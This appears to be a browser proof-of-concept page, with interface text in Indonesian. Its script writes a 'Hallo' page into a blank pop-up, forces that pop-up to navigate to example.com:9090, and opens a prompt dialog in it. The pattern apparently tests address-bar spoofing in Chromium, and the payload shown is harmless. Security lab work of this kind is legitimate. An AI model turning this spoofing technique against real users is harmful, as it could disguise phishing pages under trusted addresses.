<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <title>Chromium Port 9090 Force-Pull Lab POC</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            --bg-color: #07090e;
            --card-bg: #111827;
            --accent: #38bdf8;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --btn-bg: #2563eb;
            --btn-hover: #1d4ed8;
            --log-bg: #020617;
            --log-text: #4ade80;
        }
        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: system-ui, -apple-system, sans-serif;
            text-align: center;
            padding: 40px 20px;
            margin: 0;
        }
        .wrapper {
            background: var(--card-bg);
            padding: 35px;
            border-radius: 16px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
            max-width: 440px;
            margin: 0 auto;
            border: 1px solid #1f2937;
        }
        h2 {
            font-size: 1.4rem;
            color: var(--accent);
            margin-bottom: 8px;
            font-weight: 700;
        }
        p {
            font-size: 0.85rem;
            color: var(--text-muted);
            margin-bottom: 25px;
            line-height: 1.4;
        }
        .btn-trigger {
            background-color: var(--btn-bg);
            color: white;
            border: none;
            padding: 15px 20px;
            font-size: 1rem;
            font-weight: 600;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s, transform 0.1s;
            box-shadow: 0 4px 12px rgba(37,99,235,0.4);
        }
        .btn-trigger:hover {
            background-color: var(--btn-hover);
        }
        .btn-trigger:active {
            transform: scale(0.98);
        }
        .logger {
            margin-top: 20px;
            background: var(--log-bg);
            border: 1px solid #1e293b;
            border-radius: 8px;
            padding: 12px;
            font-family: monospace;
            font-size: 0.75rem;
            color: var(--log-text);
            text-align: left;
            height: 160px;
            overflow-y: auto;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <h2>Port 9090 Force-Pull Lab</h2>
        <p>Injeksi DOM "Hallo" dengan Redundansi Navigasi Paksa ke example.com:9090.</p>
        <button id="launchBtn" class="btn-trigger">JALANKAN PORT 9090 PULL</button>
        <div id="logBox" class="logger">[System] Menunggu perintah eksekusi...</div>
    </div>

    <script>
        const logBox = document.getElementById('logBox');

        function addLog(msg, isError = false) {
            const timeStr = new Date().toLocaleTimeString();
            const color = isError ? "#f87171" : "#4ade80";
            logBox.innerHTML += `<div style="color: ${color}; margin-bottom: 3px;">[${timeStr}] ${msg}</div>`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        document.getElementById('launchBtn').addEventListener('click', function() {
            addLog("Menginisialisasi kontainer pop-up baru...");

            // Membuka jendela baru dengan about:blank
            let targetWin = window.open('about:blank', '_blank');

            if (!targetWin) {
                addLog("ERROR: Pop-up diblokir oleh peramban seluler.", true);
                return;
            }

            try {
                addLog("Menyuntikkan konten render awal ('Hallo')...");
                
                // Menyuntikkan payload teks "Hallo" ke dalam konteks kosong
                targetWin.document.open();
                targetWin.document.write(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>Forced Port View</title>
                        <meta charset="utf-8">
                    </head>
                    <body style="background:#ffffff; color:#0f172a; text-align:center; padding-top:100px; font-family:sans-serif;">
                        <h1 style="font-size: 3.5rem; font-weight: 800; margin: 0; color: #1e293b;">Hallo</h1>
                        <p style="color: #64748b; font-size: 1.1rem; margin-top: 10px;">Payload Render Aktif - Menunggu Respon Port 9090...</p>
                    </body>
                    </html>
                `);
                targetWin.document.close();
                addLog("Payload berhasil ditulis ke dokumen.");

                // Memicu stresor ringan pada utas utama (main thread contention)
                const startTick = performance.now();
                while (performance.now() - startTick < 40) {
                    Math.random() * Math.random();
                }

                // Vektor Redundansi Navigasi Paksa ke target port non-standar (example.com:9090)
                setTimeout(() => {
                    addLog("Mengeksekusi paksa tarikan navigasi ke example.com:9090...");
                    
                    try {
                        targetWin.location.replace("https://example.com:9090");
                    } catch (e1) {
                        addLog("Fallback location.href dipicu...", true);
                        targetWin.location.href = "https://example.com:9090";
                    }
                }, 60);

                // Penguncian dialog modal untuk menguji stabilitas utas saat port merespons/gagal
                setTimeout(() => {
                    addLog("Memverifikasi responsivitas utas target...");
                    try {
                        targetWin.prompt("PORT 9090 LOCK", "State Verification");
                    } catch (promptErr) {
                        addLog("Dialog modal dibatasi oleh sandboks.", true);
                    }
                }, 200);

            } catch (err) {
                addLog("CRITICAL EXCEPTION: " + err.message, true);
            }
        });
    </script>

</body>
</html>
